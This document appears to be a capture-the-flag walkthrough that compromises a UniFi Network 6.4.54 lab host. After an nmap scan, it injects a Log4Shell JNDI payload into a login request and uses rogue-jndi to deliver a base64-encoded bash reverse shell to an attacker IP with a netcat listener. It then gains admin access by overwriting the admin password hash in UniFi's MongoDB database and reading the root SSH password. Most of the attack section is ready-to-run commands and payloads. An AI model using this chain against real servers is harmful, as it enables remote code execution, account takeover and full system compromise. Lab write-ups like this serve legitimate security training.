# ENUMERATION
Start with nmap scan
```shell
~  sudo nmap -sC -sV -v 10.129.6.30 -o nmap.txt
[sudo] password for darthv:
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 13:57 CEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating Ping Scan at 13:57
Scanning 10.129.6.30 [4 ports]
Completed Ping Scan at 13:57, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:57
Completed Parallel DNS resolution of 1 host. at 13:57, 0.00s elapsed
Initiating SYN Stealth Scan at 13:57
Scanning 10.129.6.30 [1000 ports]
Discovered open port 22/tcp on 10.129.6.30
Discovered open port 8080/tcp on 10.129.6.30
Discovered open port 8443/tcp on 10.129.6.30
Discovered open port 6789/tcp on 10.129.6.30
Completed SYN Stealth Scan at 13:57, 8.37s elapsed (1000 total ports)
Initiating Service scan at 13:57
Scanning 4 services on 10.129.6.30
Completed Service scan at 14:00, 158.18s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.6.30.
Initiating NSE at 14:00
Completed NSE at 14:00, 14.55s elapsed
Initiating NSE at 14:00
Completed NSE at 14:00, 1.15s elapsed
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Nmap scan report for 10.129.6.30
Host is up (0.078s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Tue, 23 Aug 2022 11:47:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404
|     Found</h1></body></html>
|   GetRequest, HTTPOptions:
|     HTTP/1.1 302
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Tue, 23 Aug 2022 11:47:20 GMT
|     Connection: close
|   RTSPRequest, Socks5:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 23 Aug 2022 11:47:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.129.6.30:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| http-methods:
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be 8c03 5e12 6827 d1fe 612d dc76 a919
|_SHA-1: 111b aa11 9cca 4401 7cec 6e03 dc45 5cfe 65f6 d829
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=8/23%Time=6304C0C9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Tue,\x2023\x20Aug\x202022\x
SF:2011:47:20\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84,"H
SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Tue,\x2023\x20Aug\x202022\x2011:47:20\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x204
SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2023\x20Aug\x202022\
SF:x2011:47:20\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><ht
SF:ml\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
SF:0Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family
SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
SF:Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\.1\
SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Tue,\x2023\x20Aug\x202
SF:022\x2011:47:20\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
SF::none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x93\x
SF:20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2023\x20Aug\x202022\x2011:4
SF:7:20\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.30 seconds
           Raw packets sent: 1191 (52.380KB) | Rcvd: 1124 (44.964KB)
```

Proxy port 8080 redirects to 8443, opening https://10.129.124.108:8443 on browser we can see is UniFi Netowrk version 6.4.54

A quick Google search using the keywords UniFy 6.4.54 exploit reveals an [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) that talks in-depth explotation of the [CVE-2021-44228](]://nvd.nist.gov/vuln/detail/CVE-2021-44228) vulnerability within this application. It's recomended search for some burpsuite howto.

This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection), which is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running the application and typically fully compromise the application and all its data. To determine if this is the case, we can use FoxyProxy after making a POST request to the /api/login endpoint, to pass on the request to BurpSuite, which will intercept it as a middle-man. The request can then be edited to inject commands. We provide a great module based around intercepting web requests.

# Explotation

Open burpsuite and from proxy browser with intercept on, login with test:test, then forward steps until following POST and change remember string as follow:
```html
POST /api/login HTTP/1.1

Host: 10.129.124.108:8443

Content-Length: 68

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36

Sec-Ch-Ua-Platform: "Linux"

Content-Type: application/json; charset=utf-8

Accept: */*

Origin: https://10.129.124.108:8443

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://10.129.124.108:8443/manage/account/login?redirect=%2Fmanage

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

{"username":"temp","password":"temp","remember":"${jndi:ldap://10.10.14.203/whatever}","strict":true}
```

Then right click and select send to repeater, go to repeater tab and we are ready to send every times we need this post to server.

Install maven and clone rogue-jndi tool, lets create jar file with the follow command:
First get base64 string command needed to create jar file:
```shell
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64
```

Take note from BASE64 string and create file jar:
```shell
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

Example:
```shell
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,- d}|{bash,-i}" --hostname "10.10.14.33
```


Open netcat listener to capture reverse shell:
```shell
nc -lvp 4444
```

Go to burpsuite and send againt on repeater the jndi string, on Netcat console type the following command to get an interactive shell:
```
script /dev/null -c bash
```

# Privilege Escalation

Find mongodb port:
```shell
ps aux|grep mongo
```

Searching on google we find that the default mongodb name used by Unify is ace, lets check passwords information:
```shell
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
```

Passwords are on SHA-512 Algorighm, let's generate a new password:
```shell
mkpasswd -m sha-512 Password1234
$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1
```

Update admin password:
```shell
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$NCavlUJoPQR4Np7P$rb9bQDPyEfZg0WJ6f0Rt0duLSvsnnY5EVwQiQpFk.y49ra/cUD2b/B3D06gMJ6HTF5VudOTs3PM2Ynk9SR6hd0"}})'
```

Let's now visit website with administrator and Paswrod1234 and go to settings -> site, go to ssh section and unmask root ssh password. Ready to get root/user flags.

